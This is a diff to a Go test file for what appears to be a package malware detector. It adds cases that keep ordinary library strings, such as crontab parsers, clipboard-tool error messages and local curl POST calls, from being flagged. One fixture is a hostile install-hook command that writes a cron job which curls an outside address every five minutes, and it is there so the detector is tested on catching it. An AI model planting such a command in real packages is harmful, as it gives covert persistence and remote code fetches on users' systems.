@@ -186,3 +186,29 @@ func TestInstallCurlIsACommandNotAModuleName(t *testing.T) {
 		t.Error("curl with arguments in an install hook must still mint")
 	}
 }
+
+// Pass 13: four more strings that library source merely mentions. Real lines from live mints
+// (cron-expression parsers, clipboard-tool names in an error, `curl -X POST` in a script or doc,
+// a systemd user-unit path). Hook surfaces and npm are not demoted.
+func TestCronClipboardPostSystemdAreStringsInLibrarySource(t *testing.T) {
+	for _, tc := range []struct{ eco, line string }{
+		{"pypi", `"""Parse crontab expression -> (minute, hour, dom, month, dow) sets."""`},
+		{"go", `crontab := m.triggerCrontab()`},
+		{"packagist", `'crontab' => [`},
+		{"pypi", `raise ClipboardError("wl-paste is not installed.")`},
+		{"go", `return nil, "", fmt.Errorf("clipboard image paste needs wl-clipboard (Wayland) or xclip (X11) installed")`},
+		{"pypi", `curl -sS -X POST "$MCP_UNIFIED_GATEWAY_URL/policy/explain" -d "$BODY"`},
+		{"cargo", `curl -s -X POST localhost:8600/api/ticket/1/action/open -H "Authorization: Bearer $TOKEN"`},
+		{"pypi", `path = Path.home() / ".config/systemd/user/autohilt-link.service"`},
+	} {
+		if libraryMints(tc.eco, tc.line) {
+			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
+		}
+	}
+}
+
+func TestCronPersistenceStillMintsInAnInstallHook(t *testing.T) {
+	if !hookMints("pypi", `echo "*/5 * * * * root curl http://203.0.113.9/b" > /etc/cron.d/system-update`) {
+		t.Error("writing /etc/cron.d from an install hook must still mint")
+	}
+}
